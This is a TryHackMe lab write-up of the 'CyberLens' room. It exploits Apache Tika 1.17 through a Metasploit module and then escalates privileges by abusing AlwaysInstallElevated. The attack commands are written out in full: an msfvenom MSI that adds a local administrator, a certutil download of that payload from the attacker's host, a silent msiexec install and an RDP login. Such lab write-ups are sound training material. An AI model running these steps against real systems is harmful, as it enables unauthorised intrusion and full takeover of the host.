# CyberLens - TryHackMe Writeup

## Overview 
This room is a Windows-based training machine designed to practice  penetration testing techniques, 
including web services enumeration, exploitation, post-exploitation enumeration, and Windows privilege escalation.

During this assessment, I identified an exposed Apache Tika service running on a non-standard port and used it as the initial entry point into the machine.

After gaining access as a low-privileged Windows user, I performed local enumeration and discovered that the "AlwaysInstallElevated" registry misconfiguration was enabled. 

By abusing this misconfiguration, I was able to execute a malicious MSI package with elevated privileges, create a local administrator user, connect through RDP, and complete the room.

## Reconnaissance
To begin the assessment, Imapped the target IP address to the room hostname in my local  `/etc/hosts` file.

I first attempted to append the hostname directly, but the redirection failed because the shell did not have permission to write to `/etc/hosts`.

I solved this by using `tee` with elevated privileges:
```bash
echo "10.113.178.144 cyberlens.thm" | sudo tee -a /etc/hosts
```
This allowed me to access the target by hostname instead of only by IP address.

## Service Enumeration 
After confirming connectivity to the machine, I continued by running an Nmap scan to identify open ports and exposed services:
```bash
nmap -sV -sC -Pn -p- 10.113.178.144 -oA nmapscan
```
The flags used in this scan were:
- `-sV` - detects service versions 
- `-sC` - runs default Nmap scripts 
- `-Pn` - treats the host as online and skips host discovery 
- `-p-` - scan all 65,536 ports 
- `-oA` - saves the output in multiple formats 
During the scan, I discovered a web service related to Apache Tika.

Apache Tika is commonly used for file and metadata extraction, which matched the theme of the room around metadata and image analysis.

The interesting service was exposed on a non-standard port:
`61777`
<img width="669" height="752" alt="image" src="https://github.com/user-attachments/assets/4d87d00c-3d74-49ab-a63a-6962ae6ad050" />

After seeing the Jetty-based HTTP service on port '61777', I opened it in the browser to inspect it manually:
```text
http://10.113.178.144:61777
```

The page revealed that the service was running Apache Tika:

```text
Welcome to the Apache Tika 1.17 Server
```
This confirmed that the service on port '61777' was Apache Tika.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/093b5825-034a-4907-8ec2-2f9c4c28f9f5" />

This screenshot shows the Apache Tika web interface and confirms the service version as 'Apache Tika1.17'.

## Exploitation
After identifying the Apache Tika service, I used Metasploit to search for vulnerability and i found a known remote code execution relevant module.

The relevant module was:
`exploit/windows/http/apache_tika_jp2_jscript`
I configured the module with the target IP, target port, and my listener details.

Important option included:

 - RHOSTS 10.113.178.144
   
 - RPORT 61777
   
 - LHOST 192.168.140.92
   
 - LPORT 4444

initially, the exploit completed but not create a session. This indicated that the target was likely vulnerable, but the rverse connection was not returning correctly.

To trubleshoot this, I adjusted the payload and verified that the listener IP was a reachable from the target.

After correcting the configuration, I successfully received a shell on the target machine as a low-privileged user:

`cyberlens\cyberlens`

<img width="925" height="338" alt="image" src="https://github.com/user-attachments/assets/f5483640-3771-4a0a-8f5d-ed70fb6e06bb" />

This screenshot shows the successful shell and the `whoami` output.

## Post-Exploitation Enumeration
After gaining initial access, I began enumerating the Windows host to understand the current user context and look for privilege escalation paths.

I used the following commands:

```bash
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```
The current user was:

`cyberlens\cyberlens`

The machine was running:
```bash
Microsoft Windows Server 2019 Datacenter
Version 10.0.17763 Build 17763
x64-based PC
```

The machine was not joined to a domain and was part of workgroup:

`WORKGROUP`

The user was a member of standard groups, including:

```bash
BUILTIN\Users
BUILTIN\Remote Desktop Users
NT AUTHORITY\Authenticated Users
```
The privilege output showed that the user did not have powerful privileges such as `SeImpersonatePrivilege`, so impersonation-based privilege escalation was not the best direction.

## Privilege Escalation
Since the user did not have strong token privileges, I continued checking for Windows misconfiguration.

One of the checks i performed was for `AlwaysInstallElevated`:
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Both registry keys were enabled:
`AlwaysInstallElevated    REG_DWORD    0x1`

<img width="876" height="191" alt="image" src="https://github.com/user-attachments/assets/dda60ab7-5f1f-4380-ad58-6249dc0f30df" />

This was the main privilege escalation vector.

When both the current user and local machine registry keys are set to `1`. Windows installer packages can run with elevated privileges. This allows a low-privileged user to execute an MSI package as an dministrator user.

## Exploiting AlwaysInstallElevated
To explit the misconfiguration, I created a malicious MSI package that would create a new local administrator user.

On kali, I generated the MSI using msfvenom: 

`msfvenom -p windows/x64/exec CMD='cmd.exe /c net user ozadmin Passw0rd123! /add && net localgroup administrators ozadmin /add' -a x64 --platform windows -f msi -o privesc.msi`

After generating the payload, I verified that it was a valid MSI package:
```bash
file privesc.msi
ls -lh privesc.msi
```
The file was identified as a valid Windows Installer package.

I then hosted the file from my kali machine:

`python3 -m http.server 8000`

On the target machine, I downloaded the MSI using `certutil`:

`certutil -urlcache -f http://192.168.140.92:8000/privesc.msi privesc.msi`

Then I executed it silently with `msiexec`:

`msiexec /i privesc.msi /qn`

After execution, I verified that the new user had been created and added to the local Administrators group:

```bash
net user ozadmin
net localgroup administrators
```

<img width="729" height="659" alt="image" src="https://github.com/user-attachments/assets/3b0074df-1a30-4b1e-ab1c-5944fe9c0545" />

This screenshot shows that `ozadmin` created successfully and listed inside the local `Administrators` group.

This confirmed that the privilege escalation was successful.

## Administrator Access
After ctreating the administrator user, I connected to the target over RDP.

From Kali, I used:

`xfreerdp /u:ozadmin /p:'Passw0rd123!' /v:10.113.178.144 /cert:ignore`

Because the password contained a special charecter, I wrapped it in single quotes.

After logging in successfully, I had administrator-level access to the nachine and was able to complete the room.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0cc6acdc-04b3-42f5-a557-3c1eb7afcfe0" />

This screenshot shows the successful RDP login confirming elevated access.

## Conclusion
This room demonstrated the importance of structured enumeration after gaining an initial foothold.

Even though the compromised user did not have powerful privileges such as `SeImpersonatePrivilege`, the system still contained a critical privilege escalation mosconfiguration.

The key finding was that `AlwaysInstallElevated` was enabled in both `HKCU` and `HKLM`, allowing MSI packeges to run with elevated privileges.

This exercise reinforced that Windows privileges escalation is not only about kernal exploits or token impersonation. Misconfigurations in registry settings, services, scheduled tasks, file permissions, and local users can often lead to full administrative compromise.

Overall, CyberLens was a valuable room for practicing a complete attack chain:

```bash
Web Enumeration
Apache Tika Exploitation
Initial Foothold
Windows Enumeration
AlwaysInstallElevated Discovery
MSI-Based Privilege Escalation
Administrator Access
```
